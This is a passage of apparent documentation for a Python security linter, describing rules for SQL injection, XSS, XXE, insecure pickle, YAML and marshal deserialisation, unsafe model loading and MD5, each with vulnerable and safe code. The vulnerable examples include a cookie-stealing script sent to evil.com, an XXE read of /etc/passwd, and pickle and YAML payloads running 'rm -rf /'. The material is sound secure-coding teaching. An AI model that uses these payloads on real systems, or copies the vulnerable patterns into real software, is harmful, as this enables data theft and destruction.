a severe code execution vulnerability.</p> <p>While <code>input()</code> is safe in Python 3.x (where it returns a string and does not evaluate it), using it can still be a risk if your code is ever run in a legacy or misconfigured environment where <code>input()</code> is interpreted in the Python 2 way.</p>"},{"location":"rule/CSP-D005/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code># The input() function evaluates user input in legacy environments.\nuser_data = input(\"Please enter your name: \")\n\n# If the user enters: __import__('os').system('ls')\n# The command could be executed if running in a legacy context.\nprint(f\"Hello, {user_data}\")\n</code></pre>"},{"location":"rule/CSP-D005/#safe-code-example","title":"Safe Code Example","text":"<p>In modern Python 3, <code>input()</code> is safe as it always returns a string. However, for maximum security and cross-version compatibility (if applicable), ensure you are validating or sanitizing all user-provided data.</p> <pre><code># In modern Python 3, input() returns a string and is safe from ACE.\nuser_data = input(\"Please enter your name: \")\n\n# The input is treated as a literal string.\nprint(f\"Hello, {user_data}\")\n</code></pre>"},{"location":"rule/CSP-D005/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are certain the code will only ever run in a Python 3 environment and you are comfortable with the usage, you can suppress the warning.</p> <pre><code># ignore\nuser_data = input(\"Enter expression: \")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D005\nuser_data = input(\"Enter expression: \")\n</code></pre>"},{"location":"rule/CSP-D101/","title":"CSP-D101: SQL Injection","text":"<p>Vulnerability Category: <code>Injection</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D101/#description","title":"Description","text":"<p>SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.</p> <p>This rule detects when a SQL query is constructed using unsafe string formatting (f-strings, <code>.format()</code>, or <code>%</code> formatting) with user-controlled input.</p>"},{"location":"rule/CSP-D101/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Get user input\nuser_id = input(\"Enter user ID: \")\n\n# Vulnerable query construction\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\n# Execute the query\ntry:\n    cursor.execute(query)\n    user = cursor.fetchone()\n    if user:\n        print(f\"Welcome, {user[1]}\")\n    else:\n        print(\"User not found.\")\nexcept sqlite3.Error as e:\n    print(f\"Database error: {e}\")\nfinally:\n    conn.close()\n</code></pre> An attacker could enter <code>1; DROP TABLE users</code> as the <code>user_id</code>, and the query would become <code>SELECT * FROM users WHERE id = 1; DROP TABLE users</code>, deleting the <code>users</code> table.</p>"},{"location":"rule/CSP-D101/#safe-code-example","title":"Safe Code Example","text":"<p>To prevent SQL injection, always use parameterized queries (also known as prepared statements). The database driver will then handle the safe substitution of the parameters.</p> <p><pre><code>import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Get user input\nuser_id = input(\"Enter user ID: \")\n\n# Safe parameterized query\nquery = \"SELECT * FROM users WHERE id = ?\"\n\n# Execute the query\ntry:\n    cursor.execute(query, (user_id,))\n    user = cursor.fetchone()\n    if user:\n        print(f\"Welcome, {user[1]}\")\n    else:\n        print(\"User not found.\")\nexcept sqlite3.Error as e:\n    print(f\"Database error: {e}\")\nfinally:\n    conn.close()\n</code></pre> In this safe example, the <code>?</code> is a placeholder. The database driver ensures that the <code>user_id</code> value is treated as data, not as part of the SQL command. The placeholder style can vary depending on the database driver (<code>%s</code> is also common).</p>"},{"location":"rule/CSP-D101/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>Suppressing SQL injection findings is highly discouraged. If you have rigorously sanitized the input and are certain it's safe, you can add a suppression comment.</p> <pre><code># ignore\ncursor.execute(f\"SELECT * FROM users WHERE id = {sanitized_id}\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D101\ncursor.execute(f\"SELECT * FROM users WHERE id = {sanitized_id}\")\n</code></pre>"},{"location":"rule/CSP-D102/","title":"CSP-D102: Raw SQL String with SQLAlchemy or Pandas","text":"<p>Vulnerability Category: <code>Injection</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D102/#description","title":"Description","text":"<p>This rule is a specific variant of SQL Injection (CSP-D101) that applies to the use of raw SQL strings in higher-level libraries like SQLAlchemy and pandas. Functions like <code>sqlalchemy.text()</code> and <code>pandas.read_sql_query()</code> can execute raw SQL. If user input is incorporated into these queries using string formatting, it creates a SQL injection vulnerability.</p> <p>Even when using powerful libraries, falling back to raw SQL with string concatenation re-introduces the same risks as building queries manually.</p>"},{"location":"rule/CSP-D102/#vulnerable-code-example-sqlalchemy","title":"Vulnerable Code Example (SQLAlchemy)","text":"<pre><code>from sqlalchemy import create_engine, text\nimport os\n\nengine = create_engine(\"sqlite:///example.db\")\nuser_name = input(\"Enter username: \")\n\n# The user input is directly embedded in the SQL string\n# An attacker could enter: \"' OR '1'='1\"\nwith engine.connect() as connection:\n    query = text(f\"SELECT * FROM users WHERE name = '{user_name}'\")\n    result = connection.execute(query).fetchall()\n    for row in result:\n        print(row)\n</code></pre>"},{"location":"rule/CSP-D102/#vulnerable-code-example-pandas","title":"Vulnerable Code Example (Pandas)","text":"<pre><code>import pandas as pd\nfrom sqlalchemy import create_engine\n\nengine = create_engine(\"sqlite:///example.db\")\ntable_name = input(\"Enter table to query: \")\n\n# The table name is coming from user input and is not sanitized\n# An attacker could inject SQL here. E.g., \"users; DROP TABLE users\"\ndf = pd.read_sql_query(f\"SELECT * FROM {table_name}\", engine)\nprint(df.head())\n</code></pre>"},{"location":"rule/CSP-D102/#safe-code-example-sqlalchemy","title":"Safe Code Example (SQLAlchemy)","text":"<p>SQLAlchemy's <code>text()</code> construct supports bound parameters to safely pass data into the query.</p> <pre><code>from sqlalchemy import create_engine, text\nimport os\n\nengine = create_engine(\"sqlite:///example.db\")\nuser_name = input(\"Enter username: \")\n\n# Use bound parameters (:name) to safely pass the data\nwith engine.connect() as connection:\n    query = text(\"SELECT * FROM users WHERE name = :name\")\n    result = connection.execute(query, {\"name\": user_name}).fetchall()\n    for row in result:\n        print(row)\n</code></pre>"},{"location":"rule/CSP-D102/#safe-code-example-pandas","title":"Safe Code Example (Pandas)","text":"<p>Pandas' <code>read_sql_query</code> also supports parameters.</p> <pre><code>import pandas as pd\nfrom sqlalchemy import create_engine\n\nengine = create_engine(\"sqlite:///example.db\")\nuser_id = input(\"Enter user ID: \")\n\n# The user input is passed safely as a parameter\ndf = pd.read_sql_query(\n    \"SELECT * FROM users WHERE id = ?\",\n    engine,\n    params=(user_id,)\n)\nprint(df.head())\n</code></pre>"},{"location":"rule/CSP-D102/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>This is a critical vulnerability and should not be suppressed. If you have a legitimate reason and have validated the input, you can use a suppression comment.</p> <pre><code># ignore\ndf = pd.read_sql_query(f\"SELECT * FROM {validated_table}\", engine)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D102\nquery = text(f\"SELECT * FROM users WHERE name = '{validated_name}'\")\n</code></pre>"},{"location":"rule/CSP-D103/","title":"CSP-D103: Cross-Site Scripting (XSS)","text":"<p>Vulnerability Category: <code>Injection</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D103/#description","title":"Description","text":"<p>Cross-Site Scripting (XSS) is a type of injection vulnerability that occurs when an attacker's malicious script is injected into a trusted website. The script then executes in the victim's browser, allowing the attacker to steal sensitive information (like cookies), perform actions on behalf of the user, or manipulate the content of the web page.</p> <p>This rule flags common sources of XSS in Python web frameworks, such as:</p> <ul> <li>Using <code>flask.Markup</code> or Django's <code>mark_safe</code>/<code>format_html</code> on unvalidated user input.</li> <li>Returning a <code>fastapi.responses.HTMLResponse</code> with unescaped user content.</li> <li>Disabling autoescaping in Jinja2 templates (see also CSP-D703).</li> </ul>"},{"location":"rule/CSP-D103/#vulnerable-code-example-flask","title":"Vulnerable Code Example (Flask)","text":"<pre><code>from flask import Flask, request, Markup\n\napp = Flask(__name__)\n\n@app.route('/user')\ndef user_profile():\n    user_name = request.args.get('name', '')\n\n    # This is vulnerable. The user's input is rendered directly into the HTML.\n    # An attacker can provide a URL like: /user?name=&lt;script&gt;alert('XSS')&lt;/script&gt;\n    return Markup(f\"&lt;h1&gt;Hello, {user_name}!&lt;/h1&gt;\")\n</code></pre>"},{"location":"rule/CSP-D103/#vulnerable-code-example-fastapi","title":"Vulnerable Code Example (FastAPI)","text":"<pre><code>from fastapi import FastAPI\nfrom fastapi.responses import HTMLResponse\n\napp = FastAPI()\n\n@app.get(\"/items/\")\nasync def read_items(q: str | None = None):\n    # If q contains a script, it will be executed by the browser.\n    html_content = f\"\"\"\n    &lt;html&gt;\n        &lt;body&gt;\n            &lt;h1&gt;Search results for: {q}&lt;/h1&gt;\n        &lt;/body&gt;\n    &lt;/html&gt;\n    \"\"\"\n    return HTMLResponse(content=html_content, status_code=200)\n</code></pre>"},{"location":"rule/CSP-D103/#safe-code-example-flask-with-jinja2","title":"Safe Code Example (Flask with Jinja2)","text":"<p>Web template engines like Jinja2 provide automatic escaping of variables, which is the primary defense against XSS.</p> <pre><code>from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/user')\ndef user_profile():\n    user_name = request.args.get('name', '')\n\n    # Jinja2 will automatically escape the user_name variable.\n    # &lt;script&gt; tags will be rendered as text, not executed.\n    template_string = \"&lt;h1&gt;Hello, {{ user_name }}!&lt;/h1&gt;\"\n    return render_template_string(template_string, user_name=user_name)\n</code></pre>"},{"location":"rule/CSP-D103/#safe-code-example-fastapi-with-jinja2","title":"Safe Code Example (FastAPI with Jinja2)","text":"<p>Similarly, use a templating engine with FastAPI to ensure context-aware escaping.</p> <pre><code>from fastapi import FastAPI, Request\nfrom fastapi.responses import HTMLResponse\nfrom fastapi.templating import Jinja2Templates\n\napp = FastAPI()\ntemplates = Jinja2Templates(directory=\"templates\")\n\n@app.get(\"/items/\", response_class=HTMLResponse)\nasync def read_items(request: Request, q: str | None = None):\n    # The 'q' variable will be escaped by the templating engine.\n    return templates.TemplateResponse(\n        request=request, name=\"search.html\", context={\"query\": q}\n    )\n</code></pre> <p>Where <code>templates/search.html</code> would contain:</p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Search results for: {{ query }}&lt;/h1&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"rule/CSP-D103/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>Suppressing XSS findings is extremely dangerous. Only do so if you have manually escaped the content or are certain the input is from a trusted source and cannot be manipulated by an attacker.</p> <pre><code># The 'safe_content' variable has been sanitized or is from a trusted source.\n# ignore\nreturn Markup(safe_content)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D103\nreturn Markup(safe_content)\n</code></pre>"},{"location":"rule/CSP-D104/","title":"CSP-D104: Insecure XML Parsing (XXE)","text":"<p>Vulnerability Category: <code>Injection</code></p> <p>Severity: <code>HIGH</code> to <code>MEDIUM</code></p>"},{"location":"rule/CSP-D104/#description","title":"Description","text":"<p>Parsing XML from untrusted sources using standard library modules like <code>xml.etree.ElementTree</code>, <code>xml.dom.minidom</code>, and <code>xml.sax</code> is dangerous. These parsers are susceptible to various attacks, most notably XML External Entity (XXE) injection.</p> <p>An XXE attack can allow an attacker to: - Read arbitrary files from the local filesystem. - Initiate network requests to internal and external systems. - Cause a Denial of Service (DoS) by consuming all available memory or CPU (e.g., via a \"billion laughs attack\").</p> <p>This rule flags the use of these vulnerable XML parsing libraries.</p>"},{"location":"rule/CSP-D104/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import xml.etree.ElementTree as ET\n\n# Assume untrusted_xml_string is received from a user or external source\nuntrusted_xml_string = \"\"\"\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\"\"\"\n\n# Parsing this string will cause the contents of /etc/passwd to be included\n# in the parsed document, which could then be exposed.\nroot = ET.fromstring(untrusted_xml_string)\n\n# The content of the file is now in the text of the root element\nprint(root.text)\n</code></pre>"},{"location":"rule/CSP-D104/#safe-code-example","title":"Safe Code Example","text":"<p>To safely parse XML, use the <code>defusedxml</code> library. It's a drop-in replacement for the standard library modules that disables the insecure operations.</p> <p><pre><code># First, install the library: pip install defusedxml\nimport defusedxml.ElementTree as ET\n\nuntrusted_xml_string = \"\"\"\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\"\"\"\n\ntry:\n    # The 'defusedxml' parser will raise an exception when it\n    # encounters an external entity, preventing the attack.\n    root = ET.fromstring(untrusted_xml_string)\n    print(root.text)\nexcept ET.ParseError as e:\n    print(f\"Blocked a potential XXE attack: {e}\")\n</code></pre> Simply replacing the import from <code>xml...</code> to <code>defusedxml...</code> is often enough to secure your application against XXE and other XML-based attacks.</p>"},{"location":"rule/CSP-D104/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are parsing a trusted XML document or have manually configured the parser to be safe, you can suppress this finding. However, using <code>defusedxml</code> is the recommended approach.</p> <pre><code>import xml.etree.ElementTree as ET\n\n# You have manually configured a parser to be safe\n# ignore\nroot = ET.fromstring(trusted_string, parser=safe_parser)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D104\nroot = ET.fromstring(trusted_string)\n</code></pre>"},{"location":"rule/CSP-D105/","title":"CSP-D105: Use of <code>mark_safe</code> in Django","text":"<p>Vulnerability Category: <code>Injection</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D105/#description","title":"Description","text":"<p>This rule flags the use of <code>django.utils.safestring.mark_safe</code>. In Django, template variables are automatically escaped to prevent Cross-Site Scripting (XSS) attacks. The <code>mark_safe</code> function is used to explicitly tell Django's template engine that a string is \"safe\" and should not be escaped.</p> <p>If <code>mark_safe</code> is used on a string that contains untrusted user input, it effectively bypasses Django's primary XSS protection mechanism. This can allow an attacker to inject malicious scripts into the rendered HTML.</p>"},{"location":"rule/CSP-D105/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>from django.http import HttpResponse\nfrom django.utils.safestring import mark_safe\n\ndef user_profile(request):\n    user_input = request.GET.get('name', '')\n\n    # This is vulnerable. The user's input is being marked as safe.\n    # An attacker can provide a name like: &lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;\n    safe_string = mark_safe(f\"&lt;h1&gt;Hello, {user_input}!&lt;/h1&gt;\")\n\n    return HttpResponse(safe_string)\n</code></pre> In this scenario, the script provided by the attacker would be executed in the browser of any user viewing the page.</p>"},{"location":"rule/CSP-D105/#safe-code-example","title":"Safe Code Example","text":"<p>The best practice is to avoid <code>mark_safe</code> and rely on Django's templating system to handle HTML generation and escaping.</p> <pre><code>from django.shortcuts import render\n\ndef user_profile(request):\n    user_input = request.GET.get('name', '')\n\n    # Pass the raw data to the template.\n    # The template will handle the HTML structure and escaping.\n    context = {'user_name': user_input}\n    return render(request, 'user_profile.html', context)\n</code></pre> <p><code>user_profile.html</code> template: <pre><code>&lt;h1&gt;Hello, {{ user_name }}!&lt;/h1&gt;\n</code></pre> In this safe version, Django's template engine will render the <code>&lt;h1&gt;</code> tag and automatically escape the <code>user_name</code> variable. If an attacker provides a script, it will be displayed as literal text rather than being executed.</p>"},{"location":"rule/CSP-D105/#when-is-mark_safe-okay","title":"When is <code>mark_safe</code> okay?","text":"<p><code>mark_safe</code> should only be used on content that is known to be safe, such as: - Content that is generated internally by the application and does not contain any user input. - HTML that has been sanitized by a robust library like <code>bleach</code>.</p> <pre><code>import bleach\nfrom django.utils.safestring import mark_safe\n\n# The input is cleaned by bleach, removing any dangerous tags or attributes.\ncleaned_input = bleach.clean(user_input)\n\n# It is now safe to mark the cleaned content as safe.\nsafe_string = mark_safe(cleaned_input)\n</code></pre>"},{"location":"rule/CSP-D105/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have validated that the content being passed to <code>mark_safe</code> is secure, you can suppress the finding.</p> <pre><code># The content is trusted because it is static or has been sanitized.\n# ignore\nsafe_html = mark_safe(\"&lt;p&gt;This is &lt;strong&gt;safe&lt;/strong&gt;.&lt;/p&gt;\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D105\nsafe_html = mark_safe(sanitized_user_content)\n</code></pre>"},{"location":"rule/CSP-D201/","title":"CSP-D201: Insecure Deserialization with Pickle","text":"<p>Vulnerability Category: <code>Deserialization</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D201/#description","title":"Description","text":"<p>This rule flags the use of <code>pickle</code>, <code>dill</code>, <code>shelve</code>, and <code>jsonpickle</code> for deserializing data from untrusted sources. The pickle format is not secure and can be used to execute arbitrary code. An attacker who can control the data being unpickled can craft a malicious payload that will run commands with the privileges of the application.</p> <p>Never unpickle data from an untrusted or unauthenticated source.</p> <p>This rule applies to: - <code>pickle.load()</code>, <code>pickle.loads()</code> - <code>dill.load()</code>, <code>dill.loads()</code> - <code>shelve.open()</code> - <code>jsonpickle.decode()</code> - <code>pandas.read_pickle()</code></p>"},{"location":"rule/CSP-D201/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import pickle\nimport os\nimport base64\n\n# An attacker crafts a malicious pickle payload\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('rm -rf /',))\n\nmalicious_payload = base64.b64encode(pickle.dumps(Exploit()))\n\n# In a real scenario, this payload might be received from a file,\n# a network socket, or a web request.\ndata_from_attacker = base64.b64decode(malicious_payload)\n\n# This line will execute os.system('rm -rf /')\nunpickled_data = pickle.loads(data_from_attacker)\n</code></pre>"},{"location":"rule/CSP-D201/#safe-code-example","title":"Safe Code Example","text":"<p>The safest approach is to use a secure data format like JSON, MessagePack, or Protobufs for data serialization, especially when dealing with data from external sources. These formats only support simple data types and cannot be used to execute code.</p> <pre><code>import json\n\n# Original data\nmy_data = {'name': 'Alice', 'score': 100}\n\n# Serialize to JSON (a safe format)\nserialized_data = json.dumps(my_data)\n\n# --- Send over network / save to file ---\n\n# Deserialize from JSON\n# This is safe because JSON cannot represent executable code.\nreceived_data = json.loads(serialized_data)\n\nprint(received_data)\n</code></pre>"},{"location":"rule/CSP-D201/#what-if-i-must-use-pickle","title":"What if I must use pickle?","text":"<p>If you absolutely must use pickle, you must ensure the data is trustworthy. This can be achieved by cryptographically signing the data before serialization and verifying the signature before deserialization.</p> <pre><code>import pickle\nimport hmac\nimport hashlib\n\nSECRET_KEY = b'my-super-secret-key'\n\n# --- On the trusted side (sender) ---\ndata_to_serialize = {'user_id': 123, 'role': 'guest'}\npickled_data = pickle.dumps(data_to_serialize)\n\n# Create a signature\nsignature = hmac.new(SECRET_KEY, pickled_data, hashlib.sha256).hexdigest()\n\n# Send the pickled_data and the signature together\n\n# --- On the untrusted side (receiver) ---\nreceived_pickle = pickled_data # from the sender\nreceived_signature = signature # from the sender\n\n# Verify the signature\nexpected_signature = hmac.new(SECRET_KEY, received_pickle, hashlib.sha256).hexdigest()\nif not hmac.compare_digest(expected_signature, received_signature):\n    raise ValueError(\"Invalid signature. Pickle data may be tampered.\")\n\n# It is now safe to unpickle the data\ndata = pickle.loads(received_pickle)\nprint(data)\n</code></pre>"},{"location":"rule/CSP-D201/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have verified the data is trusted (e.g., via a signature as shown above), you can suppress the finding.</p> <pre><code># The data's signature has been verified.\n# ignore\ndata = pickle.loads(verified_data)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D201\ndata = pickle.loads(verified_data)\n</code></pre>"},{"location":"rule/CSP-D202/","title":"CSP-D202: Unsafe YAML Loading","text":"<p>Vulnerability Category: <code>Deserialization</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D202/#description","title":"Description","text":"<p>This rule flags the use of <code>yaml.load()</code> from the PyYAML library without specifying the <code>Loader</code> parameter. The default loader, <code>FullLoader</code> (and the legacy <code>UnsafeLoader</code>), can execute arbitrary Python code if it encounters a specially crafted YAML document. This creates a severe remote code execution vulnerability if the YAML content comes from an untrusted source.</p>"},{"location":"rule/CSP-D202/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import yaml\nimport os\n\n# An attacker provides a malicious YAML string.\n# The '!!python/object/apply:os.system' tag instructs PyYAML to execute a command.\nmalicious_yaml = \"!!python/object/apply:os.system ['rm -rf /']\"\n\n# This line will execute os.system('rm -rf /')\n# In older PyYAML versions, yaml.load(malicious_yaml) is enough.\n# In newer versions, this requires yaml.load(malicious_yaml, Loader=yaml.FullLoader)\n# Both are dangerous.\ndocument = yaml.load(malicious_yaml, Loader=yaml.FullLoader)\n</code></pre>"},{"location":"rule/CSP-D202/#safe-code-example","title":"Safe Code Example","text":"<p>To safely load YAML documents, always use <code>yaml.safe_load()</code> or explicitly specify the <code>Loader=yaml.SafeLoader</code> argument. The safe loader can parse standard YAML tags but restricts it to simple data types like lists and dictionaries, preventing code execution.</p> <pre><code>import yaml\n\nsafe_yaml = \"\"\"\n- user: alice\n  role: admin\n- user: bob\n  role: guest\n\"\"\"\n\nmalicious_yaml = \"!!python/object/apply:os.system ['rm -rf /']\"\n\n# Using yaml.safe_load() is the recommended approach\ndocument = yaml.safe_load(safe_yaml)\nprint(document)\n\ntry:\n    # This will now raise an exception instead of executing code.\n    yaml.safe_load(malicious_yaml)\nexcept yaml.constructor.ConstructorError as e:\n    print(f\"Blocked a potential YAML deserialization attack: {e}\")\n</code></pre> <p>You can also use <code>Loader=yaml.SafeLoader</code> explicitly: <pre><code>document = yaml.load(safe_yaml, Loader=yaml.SafeLoader)\n</code></pre></p>"},{"location":"rule/CSP-D202/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are loading a YAML file that is fully trusted (e.g., an internal configuration file that is not modified by user input) and you require the full loading capabilities, you can suppress this finding. However, using <code>safe_load</code> is strongly preferred in almost all situations.</p> <pre><code># This config is trusted and requires advanced tags.\n# ignore\nconfig = yaml.load(trusted_config_file, Loader=yaml.FullLoader)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D202\nconfig = yaml.load(trusted_config_file, Loader=yaml.FullLoader)\n</code></pre>"},{"location":"rule/CSP-D203/","title":"CSP-D203: Deserialization with <code>marshal</code>","text":"<p>Vulnerability Category: <code>Deserialization</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D203/#description","title":"Description","text":"<p>This rule flags the use of <code>marshal.load()</code> and <code>marshal.loads()</code>. The <code>marshal</code> module is primarily used internally by Python to read and write the compiled <code>.pyc</code> files. The Python documentation explicitly warns that the <code>marshal</code> format is not secure and should not be used with untrusted data.</p> <p>While not as straightforward to exploit as <code>pickle</code>, a malicious <code>marshal</code> payload can crash the Python interpreter, cause a denial of service, or potentially lead to code execution in some versions of Python.</p> <p>From the official Python documentation:</p> <p>Warning: The <code>marshal</code> module is not intended to be secure against erroneous or maliciously constructed data. Never unmarshal data received from an untrusted or unauthenticated source.</p>"},{"location":"rule/CSP-D203/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import marshal\n\n# Assume 'data_from_network' is received from an untrusted source.\n# A malformed or malicious payload can crash the program.\ntry:\n    obj = marshal.loads(data_from_network)\nexcept ValueError:\n    print(\"Could not unmarshal the data.\")\n</code></pre>"},{"location":"rule/CSP-D203/#safe-code-example","title":"Safe Code Example","text":"<p>For serializing Python objects, especially for data interchange, use a secure, standardized format like JSON.</p> <pre><code>import json\n\nmy_data = {\"key\": \"value\", \"number\": 42}\n\n# Serialize with JSON\njson_string = json.dumps(my_data)\n\n# --- Send over network / save to file ---\n\n# Deserialize with JSON\n# This is safe and robust against malformed data.\ntry:\n    received_data = json.loads(json_string)\n    print(received_data)\nexcept json.JSONDecodeError:\n    print(\"Invalid JSON received.\")\n</code></pre>"},{"location":"rule/CSP-D203/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>The <code>marshal</code> module should almost never be used for data persistence or interchange. Its use is typically restricted to Python's internal workings. If you have a specific, internal use case where you control the data being unmarshalled, you can suppress the finding.</p> <pre><code>import marshal\n\n# This data is from a trusted, internal source.\n# ignore\ninternal_obj = marshal.loads(trusted_data)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D203\ninternal_obj = marshal.loads(trusted_data)\n</code></pre>"},{"location":"rule/CSP-D204/","title":"CSP-D204: Insecure Deserialization of Machine Learning Models","text":"<p>Vulnerability Category: <code>Deserialization</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D204/#description","title":"Description","text":"<p>This rule identifies the insecure loading of machine learning models from libraries like PyTorch, Keras, and Joblib. Many model formats, including <code>.pth</code>, <code>.h5</code>, and <code>.pkl</code>, use Python's <code>pickle</code> module under the hood. As described in CSP-D201, unpickling data from an untrusted source can lead to arbitrary code execution.</p> <p>Loading a malicious model file can compromise the system it's running on. Always download models from trusted sources and, when possible, use safer loading methods.</p> <p>This rule flags: - <code>torch.load()</code> without <code>weights_only=True</code> - <code>joblib.load()</code> - <code>keras.models.load_model()</code> on non-Keras native formats.</p>"},{"location":"rule/CSP-D204/#vulnerable-code-example-pytorch","title":"Vulnerable Code Example (PyTorch)","text":"<pre><code>import torch\n\n# Assume 'untrusted_model.pth' is downloaded from the internet.\n# It could contain a malicious payload in its pickled data.\nmodel = torch.load(\"untrusted_model.pth\")\n</code></pre>"},{"location":"rule/CSP-D204/#vulnerable-code-example-joblib","title":"Vulnerable Code Example (Joblib)","text":"<p><code>joblib</code> is often used to save Scikit-learn models, and it uses pickle by default.</p> <pre><code>import joblib\n\n# Loading a joblib file is equivalent to unpickling.\nmodel = joblib.load(\"untrusted_model.pkl\")\n</code></pre>"},{"location":"rule/CSP-D204/#safe-code-example-pytorch","title":"Safe Code Example (PyTorch)","text":"<p>PyTorch introduced a <code>weights_only</code> parameter to safely load only the model's tensor data, ignoring any potentially malicious code.</p> <pre><code>import torch\n\n# This will safely load the model's weights and biases.\n# It will raise an error if the file contains any other pickled objects.\ntry:\n    model_state_dict = torch.load(\"untrusted_model.pth\", weights_only=True)\n    # model.load_state_dict(model_state_dict) # then load into your model class\nexcept RuntimeError as e:\n    print(f\"Blocked potentially malicious model file: {e}\")\n</code></pre>"},{"location":"rule/CSP-D204/#safe-practices-for-all-libraries","title":"Safe Practices for All Libraries","text":"<p>For all machine learning model formats, the most important defense is source verification. 1.  Download from Trusted Sources: Only use models from official repositories or sources you trust (e.g., official PyTorch Hub, Hugging Face with scans enabled, official TensorFlow Hub). 2.  Verify Hashes: When downloading a model, verify its hash (SHA256, etc.) against the one provided by the source. 3.  Use Safe Formats: Prefer formats like <code>safetensors</code> which do not have the same arbitrary code execution risks as pickle-based formats.</p> <pre><code># pip install safetensors\nfrom safetensors.torch import load_file\n\n# Loading from a .safetensors file is secure.\nmodel_weights = load_file(\"model.safetensors\")\n# model.load_state_dict(model_weights)\n</code></pre>"},{"location":"rule/CSP-D204/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have downloaded a model file from a trusted source and have verified its integrity (e.g., by checking its hash), you can suppress this finding.</p> <pre><code>import torch\n\n# The model has been downloaded from a trusted repo and its hash was verified.\n# ignore\nmodel = torch.load(\"verified_model.pth\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D204\nmodel = torch.load(\"verified_model.pth\")\n</code></pre>"},{"location":"rule/CSP-D301/","title":"CSP-D301: Use of Weak MD5 Hashing Algorithm","text":"<p>Vulnerability Category: <code>Cryptography</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D301/#description","title":"Description","text":"<p>This rule flags the use of the MD5 hashing algorithm. MD5 is a widely used cryptographic hash function that produces a 128-bit hash value. However, it has been found to have extensive vulnerabilities and is no longer considered secure for cryptographic purposes.</p> <p>The primary weaknesses of MD5 are: 1.  Collision Vulnerability: It is computationally feasible for an attacker to find two different inputs that produce the same MD5 hash. This can be exploited to create forged digital certificates or to tamper with data without changing its hash. 2.  Pre-image Resistance: While harder than finding collisions, it's possible to find an input that generates a given hash, especially with the help of rainbow tables for common inputs like passwords.</p> <p>MD5 must not be used for security-sensitive applications, including password storage, digital signatures, or data integrity checks.</p>"},{"location":"rule/CSP-D301/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import hashlib\n\npassword = b\"my-secret-password\"\n\n# Using MD5 to hash a password is insecure.\n# The resulting hash is susceptible to collision and pre-image attacks.\nhashed_password = hashlib.md5(password).hexdigest()\n\nprint(f\"MD5 Hash: {hashed_password}\")\n</code></pre>"},{"location":"rule/CSP-D301/#safe-code-example","title":"Safe Code Example","text":"<p>Use a modern, strong hashing algorithm like SHA-256 or SHA-3. For password hashing, it is crucial to also use a salt and a key-derivation function like <code>scrypt</code> or <code>PBKDF2</code>.</p>"},{"location":"rule/CSP-D301/#for-general-hashing-data-integrity","title":"For General Hashing (Data Integrity)","text":"<pre><code>import hashlib\n\ndata = b\"some important data\"\n\n# Use SHA-256 for a secure hash\nhashed_data = hashlib.sha256(data).hexdigest()\n\nprint(f\"SHA-256 Hash: {hashed_data}\")\n</code></pre>"},{"location":"rule/CSP-D301/#for-password-hashing","title":"For Password 